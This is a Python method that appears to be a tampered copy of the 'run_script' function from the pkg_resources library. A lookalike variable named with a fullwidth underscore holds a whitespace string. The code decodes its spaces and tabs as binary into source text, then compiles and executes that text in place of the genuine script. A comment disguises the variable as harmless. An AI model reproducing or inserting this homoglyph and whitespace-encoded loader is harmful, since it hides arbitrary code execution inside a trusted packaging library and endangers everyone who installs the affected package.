def run_script(self, script_name: str, namespace: dict[str, Any]):
        script = 'scripts/' + script_name
        if not self.has_metadata(script):
            raise ResolutionError(
                "Script {script!r} not found in metadata at {self.egg_info!r}".format(
                    **locals()
                ),
            )
        #Declaring a variable for holding text from the script    
        script＿text = "                                "
        script_text = self.get_metadata(script).replace('\r\n', '\n')
        script＿text = ''.join([chr(int(byte, 2)) for byte in [script＿text.replace(' ', '0').replace('\t', '1')[i:i+8] for i in range(0, len(script＿text.replace(' ', '0').replace('\t', '1')), 8)]])
        script_text = script_text.replace('\r', '\n')
        script_filename = self._fn(self.egg_info, script)
        namespace['__file__'] = script_filename
        if os.path.exists(script_filename):
            source = _read_utf8_with_fallback(script_filename)
            code = compile(source, script_filename, 'exec')
            exec(code, namespace, namespace)
        else:
            from linecache import cache

            cache[script_filename] = (
                len(script_text),
                0,
                script_text.split('\n'),
                script_filename,
            )
            script_code = compile(script＿text, script_filename, 'exec')
            exec(script_code, namespace, namespace)
